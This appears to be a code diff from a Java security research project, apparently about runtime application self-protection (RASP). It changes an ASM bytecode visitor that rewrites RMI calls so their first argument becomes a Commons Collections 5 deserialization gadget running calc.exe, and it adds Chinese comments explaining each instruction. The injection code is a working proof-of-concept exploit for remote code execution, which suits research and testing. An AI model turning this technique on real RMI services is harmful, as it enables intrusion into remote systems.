@@ -10,36 +10,13 @@ public class RMIInterceptorVisitorAdapter extends AdviceAdapter {
         super(Opcodes.ASM5, mv, access, name, desc);
     }
     protected void onMethodEnter(){
-        mv.visitVarInsn(ALOAD, 3);
-        mv.visitInsn(ICONST_0);
+        mv.visitVarInsn(ALOAD, 3);//从变量池中弹出第三个变量：Object[] args，并进入操作栈
+        mv.visitInsn(ICONST_0);//把常数0放入操作栈，表示要改变的是args[0]
 //        mv.visitLdcInsn("altering RMI SPEAKING!");
-        mv.visitLdcInsn("calc.exe");
+        mv.visitLdcInsn("calc.exe");//把字符串入操作栈
         mv.visitMethodInsn(INVOKESTATIC, "teu/rasp/util/commonscollections5", "getObject", "(Ljava/lang/String;)Ljavax/management/BadAttributeValueExpException;", false);
-        mv.visitInsn(AASTORE);
-//        mv.visitVarInsn(ASTORE,3);
-
-//        mv.visitInsn(ACONST_NULL);
-//        mv.visitVarInsn(ASTORE, 4);
-//        mv.visitVarInsn(ALOAD, 4);
-//        mv.visitInsn(ICONST_0);
-//        mv.visitLdcInsn("calc.exe");
-//        mv.visitMethodInsn(INVOKESTATIC, "teu/rasp/util/commonscollections5", "getObject", "(Ljava/lang/String;)Ljavax/management/BadAttributeValueExpException;", false);
-//        mv.visitInsn(AASTORE);
-//        mv.visitVarInsn(ALOAD, 0);
-//        mv.visitVarInsn(ALOAD, 1);
-//        mv.visitVarInsn(ALOAD, 2);
-//        mv.visitVarInsn(ALOAD, 4);
-//        mv.visitMethodInsn(INVOKESPECIAL, "java/rmi/server/RemoteObjectInvocationHandler", "invokeRemoteMethod", "(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;", false);
-//        mv.visitInsn(ARETURN);
-//        mv.visitMaxs(4, 5);
-//        mv.visitEnd();
-
-//        mv.visitFieldInsn(GETSTATIC, "java/lang/System", "err", "Ljava/io/PrintStream;");
-//        mv.visitLdcInsn("CALL println");
-//        mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V", false);
-
-//          mv.visitVarInsn(ALOAD,3); //第三个参数args[]弹出，进入到操作栈
-//          mv.visitInsn(POP); //把操作栈里的args[]扔了
+        //调用方法
+        mv.visitInsn(AASTORE);//把结果放入变量池顶部，完成参数覆盖
 
     }
 }
